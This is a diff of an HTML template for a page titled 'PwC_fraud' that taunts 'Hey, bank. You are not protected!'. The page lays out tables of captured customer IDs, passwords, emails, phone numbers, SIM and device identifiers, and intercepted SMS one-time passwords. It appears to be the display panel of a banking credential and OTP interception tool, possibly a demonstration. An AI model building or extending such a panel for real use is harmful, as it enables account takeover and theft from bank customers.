@@ -1,23 +1,32 @@
 <head>
+	<meta name="viewport" content="width=device-width, initial-scale=1">
   <title>PwC_fraud</title>
 </head>
 
 <body>
-  <h1>Hey, bank. You are not protected!</h1>
-  {{#if set}}
-  {{> hello}}
-  {{/if}}
+<div class="container text-center" id="something">
+	<div class="row">
+	<div class="col-xs-12">
+		<p class="lead"> <h1>Hey, bank. You are not protected!</h1></p>
+	</div>
+	 </div>
+	{{#if set}}
+	<div class="row">
+	<div class="col-xs-12">
+		{{> hello}}
+	</div>
+	</div>
+	{{/if}}
+</div>
 </body>
-
 <template name="hello">
 
-<table>
+<table class="table table-striped table-bordered table-hover">
 	<thead>
 		<th>Customer ID</th>
 		<th>Password</th>
 		<th>Random number</th>
-		<th>Email ID</th>
-		<th>Mobile no.</th>
+		<th>When</th>
 	</thead>
 	<tbody>
 		{{#each column}}
@@ -25,21 +34,37 @@
 			<td>{{fldCustId}}</td>
 			<td>{{fldPassword}}</td>
 			<td>{{fldRandomNumber}}</td>
-			<td>{{fldEmail}}</td>
-			<td>{{fldPhoneNo}}</td>
+			<td>{{when}}</td>
 		</tr>
 		{{/each}}
 	</tbody>
 </table>
-<table>
+<table  class="table table-striped table-bordered table-hover">
+	<thead>
+		<th>Email ID</th>
+		<th>Mobile no.</th>
+		<th>When</th>
+	</thead>
+	<tbody>
+		{{#each coll}}
+		<tr>
+			<td>{{fldEmail}}</td>
+			<td>{{fldPhoneNo}}</td>
+			<td>{{when}}</td>
+		</tr>
+		{{/each}}
+	</tbody>
+</table>
+<table class="table table-striped table-bordered table-hover">
 	<thead>
 		<th>DeviceId</th>
-		<th>SubscriberId</th>
-		<th>SimSerialNumber</th>
-		<th>SimOperatorName</th>
+		<th>Subscriber Id</th>
+		<th>Sim Serial Number</th>
+		<th>Sim Operator Name</th>
 		<th>OTP</th>
 		<th>Sender</th>
 		<th>Customer number</th>
+		<th>When</th>
 	</thead>
 	<tbody>
 		{{#each col}}
@@ -51,6 +76,7 @@
 			<td>{{sms}}</td>
 			<td>{{no}}</td>
 			<td>{{imsi}}</td>
+			<td>{{when}}</td>
 		</tr>
 		{{/each}}
 	</tbody>
